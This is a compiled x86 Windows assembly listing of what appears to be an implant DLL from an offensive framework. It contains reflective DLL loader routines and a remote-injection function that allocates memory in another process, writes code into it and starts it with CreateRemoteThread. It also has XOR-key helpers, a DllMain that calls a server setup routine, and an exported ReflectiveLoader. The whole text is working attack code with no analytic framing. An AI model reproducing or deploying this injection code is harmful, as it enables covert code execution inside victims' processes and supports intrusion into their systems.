	movl	-32(%ebp), %eax
	movzwl	24(%eax), %eax
	cmpw	$267, %ax
	jne	L92
	movl	$0, -24(%ebp)
	movl	-32(%ebp), %eax
	addl	$120, %eax
	movl	%eax, -12(%ebp)
	jmp	L93
L92:
	movl	-32(%ebp), %eax
	movzwl	24(%eax), %eax
	cmpw	$523, %ax
	jne	L94
	movl	$1, -24(%ebp)
	movl	-32(%ebp), %eax
	addl	$136, %eax
	movl	%eax, -12(%ebp)
	jmp	L93
L94:
	movl	$0, %eax
	jmp	L95
L93:
	movl	-12(%ebp), %eax
	movl	(%eax), %eax
	movl	-24(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	-28(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_Rva2Offset
	movl	-28(%ebp), %edx
	addl	%edx, %eax
	movl	%eax, -32(%ebp)
	movl	-32(%ebp), %eax
	movl	32(%eax), %eax
	movl	-24(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	-28(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_Rva2Offset
	movl	-28(%ebp), %edx
	addl	%edx, %eax
	movl	%eax, -12(%ebp)
	movl	-32(%ebp), %eax
	movl	28(%eax), %eax
	movl	-24(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	-28(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_Rva2Offset
	movl	-28(%ebp), %edx
	addl	%edx, %eax
	movl	%eax, -36(%ebp)
	movl	-32(%ebp), %eax
	movl	36(%eax), %eax
	movl	-24(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	-28(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_Rva2Offset
	movl	-28(%ebp), %edx
	addl	%edx, %eax
	movl	%eax, -16(%ebp)
	movl	12(%ebp), %eax
	shrl	$16, %eax
	testl	%eax, %eax
	jne	L96
	movl	12(%ebp), %eax
	movzwl	%ax, %edx
	movl	-32(%ebp), %eax
	movl	16(%eax), %eax
	subl	%eax, %edx
	movl	%edx, %eax
	sall	$2, %eax
	addl	%eax, -36(%ebp)
	movl	-36(%ebp), %eax
	movl	(%eax), %eax
	movl	-24(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	-28(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_Rva2Offset
	jmp	L95
L96:
	movl	-32(%ebp), %eax
	movl	24(%eax), %eax
	movl	%eax, -20(%ebp)
	jmp	L97
L99:
	movl	-12(%ebp), %eax
	movl	(%eax), %eax
	movl	-24(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	-28(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_Rva2Offset
	movl	-28(%ebp), %edx
	addl	%edx, %eax
	movl	%eax, -40(%ebp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	-40(%ebp), %eax
	movl	%eax, (%esp)
	call	_strstr
	testl	%eax, %eax
	je	L98
	movl	-32(%ebp), %eax
	movl	28(%eax), %eax
	movl	-24(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	-28(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_Rva2Offset
	movl	-28(%ebp), %edx
	addl	%edx, %eax
	movl	%eax, -36(%ebp)
	movl	-16(%ebp), %eax
	movzwl	(%eax), %eax
	movzwl	%ax, %eax
	sall	$2, %eax
	addl	%eax, -36(%ebp)
	movl	-36(%ebp), %eax
	movl	(%eax), %eax
	movl	-24(%ebp), %edx
	movl	%edx, 8(%esp)
	movl	-28(%ebp), %edx
	movl	%edx, 4(%esp)
	movl	%eax, (%esp)
	call	_Rva2Offset
	jmp	L95
L98:
	addl	$4, -12(%ebp)
	addl	$2, -16(%ebp)
L97:
	movl	-20(%ebp), %eax
	leal	-1(%eax), %edx
	movl	%edx, -20(%ebp)
	testl	%eax, %eax
	jne	L99
	movl	$0, %eax
L95:
	leave
	ret
	.globl	_LoadLibraryR@12
	.def	_LoadLibraryR@12;	.scl	2;	.type	32;	.endef
_LoadLibraryR@12:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$56, %esp
	movl	$0, -24(%ebp)
	movl	$0, -12(%ebp)
	movl	$0, -28(%ebp)
	movl	$0, -32(%ebp)
	movl	$0, -16(%ebp)
	movl	$0, -20(%ebp)
	cmpl	$0, 8(%ebp)
	je	L101
	cmpl	$0, 12(%ebp)
	jne	L102
L101:
	movl	$0, %eax
	jmp	L106
L102:
	movl	16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_GetReflectiveLoaderOffset
	movl	%eax, -12(%ebp)
	cmpl	$0, -12(%ebp)
	je	L104
	movl	8(%ebp), %edx
	movl	-12(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -16(%ebp)
	leal	-28(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	$64, 8(%esp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__VirtualProtect@16, %eax
	call	*%eax
	subl	$16, %esp
	testl	%eax, %eax
	je	L104
	movl	-16(%ebp), %eax
	call	*%eax
	movl	%eax, -20(%ebp)
	cmpl	$0, -20(%ebp)
	je	L105
	leal	-24(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$6, 4(%esp)
	movl	$0, (%esp)
	movl	-20(%ebp), %eax
	call	*%eax
	subl	$12, %esp
	testl	%eax, %eax
	jne	L105
	movl	$0, -24(%ebp)
L105:
	movl	-28(%ebp), %eax
	leal	-32(%ebp), %edx
	movl	%edx, 12(%esp)
	movl	%eax, 8(%esp)
	movl	12(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__VirtualProtect@16, %eax
	call	*%eax
	subl	$16, %esp
L104:
	movl	-24(%ebp), %eax
L106:
	leave
	ret	$12
	.globl	_LoadRemoteLibraryR@20
	.def	_LoadRemoteLibraryR@20;	.scl	2;	.type	32;	.endef
_LoadRemoteLibraryR@20:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$72, %esp
	movl	$0, -16(%ebp)
	movl	$0, -20(%ebp)
	movl	$0, -12(%ebp)
	movl	$0, -24(%ebp)
	movl	$0, -28(%ebp)
	cmpl	$0, 8(%ebp)
	je	L114
	cmpl	$0, 12(%ebp)
	je	L114
	cmpl	$0, 16(%ebp)
	je	L114
	movl	20(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	12(%ebp), %eax
	movl	%eax, (%esp)
	call	_GetReflectiveLoaderOffset
	movl	%eax, -24(%ebp)
	cmpl	$0, -24(%ebp)
	je	L115
	movl	$4, 16(%esp)
	movl	$12288, 12(%esp)
	movl	16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	$0, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__VirtualAllocEx@20, %eax
	call	*%eax
	subl	$20, %esp
	movl	%eax, -16(%ebp)
	cmpl	$0, -16(%ebp)
	je	L116
	movl	$0, 16(%esp)
	movl	16(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	12(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__WriteProcessMemory@20, %eax
	call	*%eax
	subl	$20, %esp
	testl	%eax, %eax
	je	L117
	movl	$0, 16(%esp)
	movl	$32, 12(%esp)
	movl	16(%ebp), %eax
	movl	%eax, 8(%esp)
	movl	-16(%ebp), %eax
	movl	%eax, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__VirtualProtectEx@20, %eax
	call	*%eax
	subl	$20, %esp
	testl	%eax, %eax
	je	L118
	movl	-16(%ebp), %edx
	movl	-24(%ebp), %eax
	addl	%edx, %eax
	movl	%eax, -20(%ebp)
	leal	-28(%ebp), %eax
	movl	%eax, 24(%esp)
	movl	$0, 20(%esp)
	movl	24(%ebp), %eax
	movl	%eax, 16(%esp)
	movl	-20(%ebp), %eax
	movl	%eax, 12(%esp)
	movl	$1048576, 8(%esp)
	movl	$0, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__CreateRemoteThread@28, %eax
	call	*%eax
	subl	$28, %esp
	movl	%eax, -12(%ebp)
	jmp	L114
L115:
	nop
	jmp	L114
L116:
	nop
	jmp	L114
L117:
	nop
	jmp	L114
L118:
	nop
L114:
	movl	-12(%ebp), %eax
	leave
	ret	$20
	.globl	_Init
	.def	_Init;	.scl	2;	.type	32;	.endef
_Init:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	_hAppInstance, %eax
	testl	%eax, %eax
	jne	L120
	movl	$0, (%esp)
	movl	__imp__GetModuleHandleA@4, %eax
	call	*%eax
	subl	$4, %esp
	movl	%eax, _hAppInstance
L120:
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_server_setup
	movl	%eax, -12(%ebp)
	movl	8(%ebp), %eax
	movl	8(%eax), %eax
	cmpl	$-365818114, %eax
	je	L121
	cmpl	$-365818114, %eax
	ja	L127
	cmpl	$170532320, %eax
	je	L123
	cmpl	$1453503984, %eax
	je	L124
	jmp	L127
L121:
	movl	$0, (%esp)
	movl	__imp__SetUnhandledExceptionFilter@4, %eax
	call	*%eax
	subl	$4, %esp
	jmp	L125
L123:
	movl	$0, (%esp)
	movl	__imp__ExitThread@4, %eax
	call	*%eax
L124:
	movl	$0, (%esp)
	movl	__imp__ExitProcess@4, %eax
	call	*%eax
L127:
	nop
L125:
	movl	-12(%ebp), %eax
	leave
	ret
	.globl	_DllMain@12
	.def	_DllMain@12;	.scl	2;	.type	32;	.endef
_DllMain@12:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$40, %esp
	movl	$1, -12(%ebp)
	cmpl	$6, 12(%ebp)
	ja	L129
	movl	12(%ebp), %eax
	sall	$2, %eax
	addl	$L131, %eax
	movl	(%eax), %eax
	jmp	*%eax
	.section .rdata,"dr"
	.align 4
L131:
	.long	L129
	.long	L134
	.long	L129
	.long	L129
	.long	L132
	.long	L129
	.long	L130
	.text
L132:
	movl	16(%ebp), %eax
	movl	%eax, (%esp)
	call	_Init
	movl	%eax, -12(%ebp)
	jmp	L129
L130:
	cmpl	$0, 16(%ebp)
	je	L137
	movl	_hAppInstance, %edx
	movl	16(%ebp), %eax
	movl	%edx, (%eax)
	jmp	L137
L134:
	movl	8(%ebp), %eax
	movl	%eax, _hAppInstance
	jmp	L129
L137:
	nop
L129:
	movl	-12(%ebp), %eax
	leave
	ret	$12
	.def	___udivdi3;	.scl	2;	.type	32;	.endef
	.globl	_current_unix_timestamp
	.def	_current_unix_timestamp;	.scl	2;	.type	32;	.endef
_current_unix_timestamp:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$56, %esp
	leal	-24(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__GetSystemTime@4, %eax
	call	*%eax
	subl	$4, %esp
	leal	-32(%ebp), %eax
	movl	%eax, 4(%esp)
	leal	-24(%ebp), %eax
	movl	%eax, (%esp)
	movl	__imp__SystemTimeToFileTime@8, %eax
	call	*%eax
	subl	$8, %esp
	movl	-32(%ebp), %eax
	movl	%eax, -40(%ebp)
	movl	-28(%ebp), %eax
	movl	%eax, -36(%ebp)
	movl	-40(%ebp), %eax
	movl	-36(%ebp), %edx
	addl	$717324288, %eax
	adcl	$-27111903, %edx
	movl	$10000000, 8(%esp)
	movl	$0, 12(%esp)
	movl	%eax, (%esp)
	movl	%edx, 4(%esp)
	call	___udivdi3
	leave
	ret
	.globl	_sleep
	.def	_sleep;	.scl	2;	.type	32;	.endef
_sleep:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$24, %esp
	jmp	L141
L142:
	movl	$-296, (%esp)
	movl	__imp__Sleep@4, %eax
	call	*%eax
	subl	$4, %esp
	subl	$4294967, 8(%ebp)
L141:
	cmpl	$4294967, 8(%ebp)
	ja	L142
	movl	8(%ebp), %eax
	imull	$1000, %eax, %eax
	movl	%eax, (%esp)
	movl	__imp__Sleep@4, %eax
	call	*%eax
	subl	$4, %esp
	nop
	leave
	ret
	.globl	_xor_bytes
	.def	_xor_bytes;	.scl	2;	.type	32;	.endef
_xor_bytes:
	pushl	%ebp
	movl	%esp, %ebp
	pushl	%ebx
	subl	$16, %esp
	movl	$0, -8(%ebp)
	jmp	L144
L145:
	movl	12(%ebp), %edx
	movl	-8(%ebp), %eax
	addl	%edx, %eax
	movzbl	(%eax), %ebx
	movl	-8(%ebp), %eax
	andl	$3, %eax
	movl	%eax, %edx
	movl	8(%ebp), %eax
	addl	%edx, %eax
	movzbl	(%eax), %ecx
	movl	12(%ebp), %edx
	movl	-8(%ebp), %eax
	addl	%edx, %eax
	xorl	%ecx, %ebx
	movl	%ebx, %edx
	movb	%dl, (%eax)
	addl	$1, -8(%ebp)
L144:
	movl	-8(%ebp), %eax
	cmpl	16(%ebp), %eax
	jb	L145
	nop
	nop
	addl	$16, %esp
	popl	%ebx
	popl	%ebp
	ret
	.globl	_rand_xor_key
	.def	_rand_xor_key;	.scl	2;	.type	32;	.endef
_rand_xor_key:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$24, %esp
	movl	_initialised.83404, %eax
	testl	%eax, %eax
	jne	L147
	movl	$0, (%esp)
	call	_time
	movl	%eax, (%esp)
	call	_srand
	movl	$1, _initialised.83404
L147:
	call	_rand
	movl	%eax, %ecx
	movl	$-2130574327, %edx
	movl	%ecx, %eax
	imull	%edx
	leal	(%edx,%ecx), %eax
	sarl	$7, %eax
	movl	%eax, %edx
	movl	%ecx, %eax
	sarl	$31, %eax
	subl	%eax, %edx
	movl	%edx, %eax
	imull	$254, %eax, %eax
	subl	%eax, %ecx
	movl	%ecx, %eax
	leal	1(%eax), %edx
	movl	8(%ebp), %eax
	movb	%dl, (%eax)
	call	_rand
	movl	%eax, %ecx
	movl	$-2130574327, %edx
	movl	%ecx, %eax
	imull	%edx
	leal	(%edx,%ecx), %eax
	sarl	$7, %eax
	movl	%eax, %edx
	movl	%ecx, %eax
	sarl	$31, %eax
	subl	%eax, %edx
	movl	%edx, %eax
	imull	$254, %eax, %eax
	subl	%eax, %ecx
	movl	%ecx, %eax
	movl	%eax, %edx
	movl	8(%ebp), %eax
	addl	$1, %eax
	addl	$1, %edx
	movb	%dl, (%eax)
	call	_rand
	movl	%eax, %ecx
	movl	$-2130574327, %edx
	movl	%ecx, %eax
	imull	%edx
	leal	(%edx,%ecx), %eax
	sarl	$7, %eax
	movl	%eax, %edx
	movl	%ecx, %eax
	sarl	$31, %eax
	subl	%eax, %edx
	movl	%edx, %eax
	imull	$254, %eax, %eax
	subl	%eax, %ecx
	movl	%ecx, %eax
	movl	%eax, %edx
	movl	8(%ebp), %eax
	addl	$2, %eax
	addl	$1, %edx
	movb	%dl, (%eax)
	call	_rand
	movl	%eax, %ecx
	movl	$-2130574327, %edx
	movl	%ecx, %eax
	imull	%edx
	leal	(%edx,%ecx), %eax
	sarl	$7, %eax
	movl	%eax, %edx
	movl	%ecx, %eax
	sarl	$31, %eax
	subl	%eax, %edx
	movl	%edx, %eax
	imull	$254, %eax, %eax
	subl	%eax, %ecx
	movl	%ecx, %eax
	movl	%eax, %edx
	movl	8(%ebp), %eax
	addl	$3, %eax
	addl	$1, %edx
	movb	%dl, (%eax)
	nop
	leave
	ret
	.section .rdata,"dr"
LC0:
	.ascii "\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0"
	.text
	.globl	_is_null_guid
	.def	_is_null_guid;	.scl	2;	.type	32;	.endef
_is_null_guid:
	pushl	%ebp
	movl	%esp, %ebp
	subl	$24, %esp
	movl	$16, 8(%esp)
	movl	$LC0, 4(%esp)
	movl	8(%ebp), %eax
	movl	%eax, (%esp)
	call	_memcmp
	testl	%eax, %eax
	sete	%al
	movzbl	%al, %eax
	leave
	ret
.lcomm _initialised.83404,4,4
	.ident	"GCC: (GNU) 9.3-win32 20200320"
	.def	_strcmp;	.scl	2;	.type	32;	.endef
	.def	_strstr;	.scl	2;	.type	32;	.endef
	.def	_server_setup;	.scl	2;	.type	32;	.endef
	.def	_srand;	.scl	2;	.type	32;	.endef
	.def	_rand;	.scl	2;	.type	32;	.endef
	.def	_memcmp;	.scl	2;	.type	32;	.endef
	.section .drectve
	.ascii " -export:\"ReflectiveLoader@0\""
